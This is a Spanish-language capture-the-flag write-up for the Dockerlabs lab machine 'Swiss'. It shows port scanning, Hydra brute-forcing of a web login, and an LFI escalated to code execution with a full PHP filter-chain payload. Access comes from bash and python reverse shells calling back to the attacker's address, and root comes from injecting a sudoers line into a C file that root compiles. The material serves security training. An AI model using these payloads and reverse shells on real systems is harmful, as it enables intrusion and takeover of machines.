
# Writeup Template: Maquina `[ Swiss ]`

- Tags: #Swiss
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Swiss](https://mega.nz/file/vdtjRZJR#Ao1QF3I7aMh0db5X2YjchpusbBa_LzpvA2JTUhO3EmQ)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x swiss.zip
sudo bash auto_deploy.sh swiss.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  tcpwrapped
```
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/images/              (Status: 200) [Size: 5911]
/icons/               (Status: 403) [Size: 275]
/scripts/             (Status: 200) [Size: 1329]
[ERROR] Get "http://172.17.0.2/10/": read tcp 172.17.0.1:48584->172.17.0.2:80: read: connection reset by peer
[ERROR] Get "http://172.17.0.2/cgi-bin/": read tcp 172.17.0.1:48610->172.17.0.2:80: read: connection reset by peer
```

Tenemos esta url :
```bash
http://172.17.0.2/index.php
```

Ahora en el apartado **sobremi** de la pagina que nos lleva en un panel de login:
```bash
http://172.17.0.2/sobre-mi/sms.php
```

Realizamos un ataque de fuerza bruta para este panel de inicio de sesion:
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form '/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.' -F -V -t 64 -I -u
```
### Credenciales Encontradas
```bash
80][http-post-form] host: 172.17.0.2   login: administrator   password: panther
```

Iniciamos session con las siguientes credenciales:
```bash
username: administrator
password: panther
```

Una ves logueados tenemos este mensaje:
```bash
## Darks, el sistema a sido configurado para restringir un rango de ip por seguridad, ten esto en cuenta ya que si no te encuentras en el segmento correcto nada funcionara, tus nuevas credenciales ssh son: darks:_dkvndsqwcdfef34445
```

Revisamos si existe algun parametro al que este llamando desde esta url:
```bash
http://172.17.0.2/sobre-mi/index.php
```

```bash
ffuf -u http://172.17.0.2/index.php\?FUZZ\=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 22274
```

Tenemos como resultado:
```bash
file                    [Status: 200, Size: 23613, Words: 6185, Lines: 475, Duration: 0ms]
```

Realizaremos fuzzing sobre esta ruta:
```bash
 wfuzz -c --hw 1365 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/index.php?file=FUZZ"
```

Resultado:
```bash
../../../../../../../../../../../../../../../../../../../etc/passwd"
../../../../../../../../../../../../../etc/passwd"                  
../../../../../etc/passwd"                                          
../../../../../../../../../../../../../../../../../etc/passwd"      
../../../etc/passwd"                                                
../../../../../../etc/passwd"                                       
../../../../etc/passwd"                                             
../../../../../../../etc/passwd"                                    
../../../../../../../../etc/passwd"                                 
../../../../../../../../../../etc/passwd"                           
../../../../../../../../../etc/passwd"                              
../../../../../../../../../../../etc/passwd"                        
../../../../../../../../../../../../../../etc/passwd"               
../../../../../../../../../../../../etc/passwd"                     
../../../../../../../../../../../../../../../etc/passwd"            
../../../../../../../../../../../../../../../../../../etc/passwd"   
../../../../../../../../../../../../../../../../etc/passwd"         
../../../../../../etc/passwd&=%3C%3C%3C%3C"                         
/etc/ssh/sshd_config"                                               
/etc/resolv.conf"                                                   
/etc/rpc"                                                           
/proc/partitions"                                                   
/proc/version"                                                      
/proc/self/status"                                                  
/proc/self/cmdline"                                                 
/proc/net/route"                                                    
/proc/net/tcp"                                                      
/proc/net/dev"                                                      
/proc/net/arp"                                                      
/proc/mounts"                                                       
/proc/meminfo"                                                      
/proc/loadavg"                                                      
/proc/cpuinfo"                                                      
/var/log/lastlog"                                                   
/var/log/wtmp"                                                      
///////../../../etc/passwd"                                         
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos un **LFI** lo derivaremos a un **RCE** aprovechandonos de **PHPFilterChains**, Generamos el payload para poder controlar un comando a nivel de sistema:
```bash
php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

### Ejecucion del Ataque
Copiamos todo el **payload** y lo pegamos el la url y le damos enter:
```bash
# Comandos para explotación
172.17.0.2/index.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=whoami
```

En el resultado tenemos exito hemos logrado ejecutar comandos en el objetivo:
```bash
www-data � P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

Sabiendo que aceptar la conexio por la ip: **200** procedemos a modificar nuestra ip
```bash
Eliminamos la actual
ip address del 172.17.0.1/16 dev docker0
RTNETLINK answers: Operation not permitted
```

Ahora agregamos la nueva: y ahora tenemos esta ip local:
```bash
sudo ip address add 172.17.0.200/16 dev docker0
```

### Intrusion
Modo escucha para ganar acceso al target:
```bash
nc -nlvp 443
```

Hasta el ultimo de todo el payload colocamos esta instruccion para que puedamos ganar acceso
```bash
# Reverse shell o acceso inicial
php://temp&cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.200/443 <%261'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &file=<CONTENT_GENERATE>
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
En la siguiente ruta: **( /var/www )** tenemos el siguiente archivo: 
```bash
-rwxr-xr-x  1 www-data www-data 16464 Nov 12  2024 sendinv2
```

Si revisamos sus lineas legible vemos que se esta intentando conectar a la siguiente direccion IP:
```bash
Error al crear el socket
172.17.0.188
Error al enviar datos
```

Ahora modificaremos nuestra direccion IP para hacernos pasar por esa direccion **IP**
```bash
sudo ip address del 172.17.0.200/16 dev docker0
sudo ip address add 172.17.0.188/16 dev docker0
```

Ahora nos ponemos en eschucha para ver los paquetes que se trasmiten en esa red:
```bash
sudo tcpdump -i docker0
```

ahora ejecutamos el binario desde la maquina victima:
```bash
./sendinv2
```

Vemos que esta intentando conectarse por la siguiente direccion IP al siguiente puerto:
```bash
14:53:39.011841 IP 172.17.0.188 > 172.17.0.2: ICMP 172.17.0.188 udp port 7777 unreachable, length 372
```

Lo que aremos es ponernos en escucha por ese puerto
```bash
nc -lvnp 7777
```

Volvemo a ejecutar el comando:
```bash
./sendinv2
```

Tenemos lo siguiente:
```bash
echo "aG9sYSEgc29tb3MgZWwgZ3J1cG8gQmxhY2tDYXQsIHBlbnNhbW9zIGVuIGVuY3JpcHRhciBlc3RlIHNlcnZlciBwZXJvIG5vIHRpZW5lIG5hZGEgZGUgaW50ZXJlcywgdGUgYWhvcnJhcmUgdGllbXBvOiBjcmlzdGFsOmRyb3BjaG9zdG9wNDUzU0pGIDogZGlzZnJ1dGEK" | base64 -d
hola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta
```

Nos conectamos por ssh:
```bash
ssh-keygen -R 172.17.0.2 && ssh cristal@172.17.0.2
```

### Explotacion de Privilegios

###### Usuario `[ cristal ]`:
Listando los procesos del sistema vemos que estan ejecutando **root** en el systema:
```bash
root          41  0.0  0.0   4324  3264 ?        S    20:37   0:00 /bin/bash /home/cristal/systm.sh
```

Si revisamos el contenido:
```bash
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```

Esta compilando el archivo y lo guarad como **syst** como tenemos capacidad de escritura sobre ese archivo y sabiendo que lo ejecuta **root** nos aprovechamos de eso para modificarlo
Modificamos el **systm.c**
```c
int main() {
    const char *log_filename = "/tmp/registros.log";

    // Comando a ejecutar
    const char *command = "echo 'cristal    ALL=(ALL:ALL) ALL' >> /etc/sudoers";
    (void)system(command);

    log_system_info(log_filename);

    return 0;
}
```

Despues ejecutamos:
```bash
sudo -l
```

```bash
User cristal may run the following commands on 4908ac5e2c44:
    (ALL : ALL) ALL
```

```bash
# Comando para escalar al usuario: ( root )
sudo su
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@4908ac5e2c44:/home/cristal# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a derivar un **LFI** a un **RCE**
2. Aprendimos a usar **PHPFilterChain** para ganar acceso al objetivo
3. Aprendimos a envenenar un archivo de **c** para ejecutar una instruccion como **root**